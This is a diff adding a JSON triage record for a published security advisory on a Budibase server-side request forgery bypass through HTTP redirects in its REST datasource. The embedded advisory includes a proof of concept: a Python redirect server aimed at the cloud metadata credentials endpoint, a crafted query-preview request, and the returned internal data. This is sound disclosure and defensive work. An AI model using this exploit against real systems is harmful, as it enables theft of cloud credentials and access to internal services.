@@ -1,0 +1,57 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/86569763?v=4\", \"events_url\": \"https://api.github.com/users/sajdakabir/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/sajdakabir/followers\", \"following_url\": \"https://api.github.com/users/sajdakabir/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/sajdakabir/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/sajdakabir\", \"id\": 86569763, \"login\": \"sajdakabir\", \"node_id\": \"MDQ6VXNlcjg2NTY5NzYz\", \"organizations_url\": \"https://api.github.com/users/sajdakabir/orgs\", \"received_events_url\": \"https://api.github.com/users/sajdakabir/received_events\", \"repos_url\": \"https://api.github.com/users/sajdakabir/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/sajdakabir/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/sajdakabir/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/sajdakabir\", \"user_view_type\": \"public\"}}, {\"type\": \"finder\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/263321994?v=4\", \"events_url\": \"https://api.github.com/users/zerotrail-ai/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/zerotrail-ai/followers\", \"following_url\": \"https://api.github.com/users/zerotrail-ai/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/zerotrail-ai/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/zerotrail-ai\", \"id\": 263321994, \"login\": \"zerotrail-ai\", \"node_id\": \"U_kgDOD7H5ig\", \"organizations_url\": \"https://api.github.com/users/zerotrail-ai/orgs\", \"received_events_url\": \"https://api.github.com/users/zerotrail-ai/received_events\", \"repos_url\": \"https://api.github.com/users/zerotrail-ai/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/zerotrail-ai/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/zerotrail-ai/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/zerotrail-ai\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-45715\", \"cvss\": {\"score\": 7.7, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 7.7, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-918\", \"name\": \"Server-Side Request Forgery (SSRF)\"}], \"description\": \"### Summary\\n\\nThe REST datasource integration follows HTTP redirects without re-checking the IP blacklist, allowing an authenticated Builder to access internal services (cloud metadata, databases) by redirecting through an attacker-controlled server. The same vulnerability class was already patched in automation steps (`fetchWithBlacklist` in `packages/server/src/automations/steps/utils.ts`) but the REST integration was missed.\\n\\n### Details\\n\\n**Vulnerable file:** `packages/server/src/integrations/rest.ts`, lines 754-778\\n\\nThe `_req()` method checks the request URL against the IP blacklist at line 754, then calls `fetch(url, input)` at line 778. No `redirect: \\\"manual\\\"` option is set, so undici's fetch defaults to `redirect: \\\"follow\\\"`, automatically following HTTP 301/302/307 redirects **without re-validating the redirect target against the blacklist**.\\n\\n```typescript\\n// Line 754 — blacklist check on original URL only\\nif (await blacklist.isBlacklisted(url)) {\\n  throw new Error(\\\"URL is blocked or could not be resolved safely.\\\")\\n}\\n\\n// Line 778 — fetch follows redirects, NO re-check on redirect target\\nresponse = await fetch(url, input)\\n```\\n\\nThe automation steps already implement the correct fix in `packages/server/src/automations/steps/utils.ts` (lines 100-136) via `fetchWithBlacklist()`, which sets `redirect: \\\"manual\\\"` and re-checks the blacklist on every redirect hop. The REST integration does not use this safe wrapper.\\n\\nRelevant prior fix commits on the automation side:\\n- `6cfa3bcca3` — \\\"fix(server): enforce outbound blacklist in webhook automation steps\\\"\\n- `e7d47625be` — \\\"Fix automation webhook blacklist redirect bypass\\\"\\n\\n### PoC\\n\\n**Step 1 — Set up a redirect server (attacker-controlled):**\\n\\n```python\\nfrom http.server import HTTPServer, BaseHTTPRequestHandler\\n\\nclass RedirectHandler(BaseHTTPRequestHandler):\\n    def do_GET(self):\\n        self.send_response(302)\\n        self.send_header('Location', 'http://169.254.169.254/latest/meta-data/iam/security-credentials/')\\n        self.end_headers()\\n\\nHTTPServer(('0.0.0.0', 8080), RedirectHandler).serve_forever()\\n```\\n\\n**Step 2 — As a Builder, create a REST datasource pointing to the attacker's server.**\\n\\n**Step 3 — Preview a query:**\\n\\n```http\\nPOST /api/queries/preview HTTP/1.1\\nHost: <budibase-instance>\\nContent-Type: application/json\\nCookie: <builder-session>\\nx-budibase-app-id: <app-id>\\n\\n{\\n  \\\"datasourceId\\\": \\\"<rest-datasource-id>\\\",\\n  \\\"queryVerb\\\": \\\"read\\\",\\n  \\\"fields\\\": {\\n    \\\"path\\\": \\\"http://<attacker-ip>:8080/\\\",\\n    \\\"queryString\\\": \\\"\\\",\\n    \\\"headers\\\": {},\\n    \\\"bodyType\\\": \\\"none\\\",\\n    \\\"requestBody\\\": \\\"\\\"\\n  },\\n  \\\"parameters\\\": [],\\n  \\\"transformer\\\": \\\"return data\\\",\\n  \\\"name\\\": \\\"ssrf-test\\\",\\n  \\\"schema\\\": {}\\n}\\n```\\n\\n**Step 4 — The blacklist check passes (attacker IP is public), undici follows the 302 redirect to the internal target, and the response is returned:**\\n\\n```json\\n{\\n  \\\"rows\\\": [{\\n    \\\"couchdb\\\": \\\"Welcome\\\",\\n    \\\"version\\\": \\\"3.3.3\\\",\\n    \\\"uuid\\\": \\\"a84d3353128485a22973a759df2387bc\\\"\\n  }]\\n}\\n```\\n\\nTested and confirmed on Budibase v3.34.6 running locally with default blacklist active.\\n\\n### Impact\\n\\n- **Cloud credential theft:** On AWS/GCP/Azure instances, attacker accesses `169.254.169.254` to steal IAM credentials or service account tokens.\\n- **Internal service access:** CouchDB (`:4005`), Redis (`:6379`), MinIO (`:4004`), and other internal services become accessible\\n- **Bypasses explicit security control:** The IP blacklist exists specifically to prevent this, and works correctly for direct access — only the redirect path is unprotected.\\n- **Already-known vulnerability class:** This was previously identified and fixed in automation steps (commits `6cfa3bcca3`, `e7d47625be`) but the REST datasource integration was not patched.\", \"epss\": {\"percentage\": 0.00258, \"percentile\": 0.16874}, \"ghsa_id\": \"GHSA-fgqv-jh4g-pvg2\", \"github_reviewed_at\": \"2026-05-15T17:53:08Z\", \"html_url\": \"https://github.com/advisories/GHSA-fgqv-jh4g-pvg2\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-fgqv-jh4g-pvg2\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-45715\"}], \"nvd_published_at\": \"2026-05-27T18:16:25Z\", \"published_at\": \"2026-05-15T17:53:08Z\", \"references\": [\"https://github.com/Budibase/budibase/security/advisories/GHSA-fgqv-jh4g-pvg2\", \"https://github.com/Budibase/budibase/releases/tag/3.38.1\", \"https://nvd.nist.gov/vuln/detail/CVE-2026-45715\", \"https://github.com/advisories/GHSA-fgqv-jh4g-pvg2\"], \"repository_advisory_url\": \"https://api.github.com/repos/Budibase/budibase/security-advisories/GHSA-fgqv-jh4g-pvg2\", \"severity\": \"high\", \"source_code_location\": \"https://github.com/Budibase/budibase\", \"summary\": \"Budibase: SSRF Bypass via HTTP Redirect in REST Datasource Integration\", \"type\": \"reviewed\", \"updated_at\": \"2026-06-08T23:50:38Z\", \"url\": \"https://api.github.com/advisories/GHSA-fgqv-jh4g-pvg2\", \"vulnerabilities\": [{\"first_patched_version\": \"3.38.1\", \"package\": {\"ecosystem\": \"npm\", \"name\": \"@budibase/server\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"< 3.38.1\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-fgqv-jh4g-pvg2",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "@budibase/server: < 3.38.1"
+    ],
+    "authentication_required": true,
+    "cves": [
+      "CVE-2026-45715"
+    ],
+    "cvss_score": 7.7,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "@budibase/server"
+    ],
+    "remote": true,
+    "vendor_severity": "high"
+  },
+  "first_seen_at": "2026-07-20T19:51:59.989773Z",
+  "provenance": {
+    "content_sha256": "487b13c3724f68b8973b6a18889c901dd0e2cfe8369cdd740b367a3ea24dec22",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-05-15T17:53:08Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-fgqv-jh4g-pvg2",
+  "status": "active",
+  "title": "Budibase: SSRF Bypass via HTTP Redirect in REST Datasource Integration",
+  "updated_at": "2026-06-08T23:50:38Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-fgqv-jh4g-pvg2"
+}
